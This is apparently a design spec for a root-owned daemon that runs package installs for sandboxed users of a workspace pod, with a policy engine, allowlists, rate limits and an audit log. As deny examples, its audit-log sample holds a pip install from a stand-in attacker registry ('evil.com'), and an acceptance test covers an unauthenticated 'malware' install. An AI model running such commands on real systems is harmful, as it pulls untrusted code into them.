# US-7.1: System Daemon

**Epic:** 7 — Runtime Interception Layer
**Status:** Planning
**Dependencies:** None

## Objective

Build a root-owned daemon process that runs inside the workspace pod, listens on a Unix socket, and executes privileged operations (package installs) on behalf of the unprivileged sandbox user. This is the privilege escalation gateway — all root operations flow through it.

## Design

### Process Model

The daemon runs as PID 1 (replaces current entrypoint chain) or as a separate process started by the entrypoint before `opencode serve`. It:
- Starts as root
- Creates and listens on `/run/llmsafespace/system.sock`
- Sets socket permissions to `0660 root:sandbox`
- Forks/execs child processes for actual package manager invocations
- Never drops privileges itself (it IS the privileged helper)

### Protocol

JSON-over-Unix-socket, newline-delimited. Request/response pattern.

```go
type Request struct {
    ID      string   `json:"id"`       // UUID, for correlating response
    Command string   `json:"command"`  // e.g. "apt", "pip", "npm"
    Args    []string `json:"args"`     // e.g. ["install", "python3"]
}

type Response struct {
    ID       string `json:"id"`
    ExitCode int    `json:"exitCode"`
    Error    string `json:"error,omitempty"` // policy rejection reason
}
```

Stdout/stderr are streamed back over the socket as they arrive (line-buffered), prefixed with stream type:

```
{"id":"...","stream":"stdout","data":"Reading package lists...\n"}
{"id":"...","stream":"stderr","data":"WARNING: ...\n"}
{"id":"...","done":true,"exitCode":0}
```

### Policy Engine

Before executing any command, the daemon checks:

1. **Command allowlist** — only `apt`, `pip`, `npm`, `cargo`, `go` (configurable)
2. **Subcommand allowlist** — `install`, `update`, `upgrade` (not `remove` by default)
3. **Source restrictions** — no `--index-url` pointing to non-allowlisted registries
4. **Blocked packages** — configurable denylist
5. **Rate limiting** — max N installs per minute (default 10)

Policy is loaded from `/etc/llmsafespace/daemon/policy.json` (mounted ConfigMap).

### Audit Log

Every request is logged to `/var/log/llmsafespace/audit.jsonl`:

```json
{"ts":"2026-05-24T20:00:00Z","id":"...","command":"apt","args":["install","python3"],"decision":"allow","exitCode":0,"durationMs":3200}
{"ts":"2026-05-24T20:00:05Z","id":"...","command":"pip","args":["install","--index-url","https://evil.com","pkg"],"decision":"deny","reason":"source not in allowlist"}
```

## Files Created

| File | Purpose |
|------|---------|
| `cmd/system-daemon/main.go` | Entrypoint: socket setup, signal handling, graceful shutdown |
| `cmd/system-daemon/handler.go` | Request parsing, policy check, exec, stream response |
| `cmd/system-daemon/policy.go` | Policy loading and evaluation |
| `cmd/system-daemon/audit.go` | Audit log writer |

## Acceptance Criteria

1. Daemon starts, creates socket at `/run/llmsafespace/system.sock`
2. Socket permissions are `0660 root:sandbox`
3. Daemon executes `apt install curl` when requested via socket (as root)
4. Daemon rejects `apt install --allow-unauthenticated malware` (blocked flag)
5. Daemon rejects requests exceeding rate limit
6. Audit log contains all requests with decisions
7. Daemon handles SIGTERM gracefully (finishes in-flight request, then exits)
8. Unit tests cover: policy allow, policy deny, rate limit, malformed request, concurrent requests

## Non-Goals

- No TLS on the socket (Unix socket + file permissions are sufficient)
- No authentication beyond socket permissions (if you can connect, you're the sandbox user)
- No package removal support in V1 (install-only)
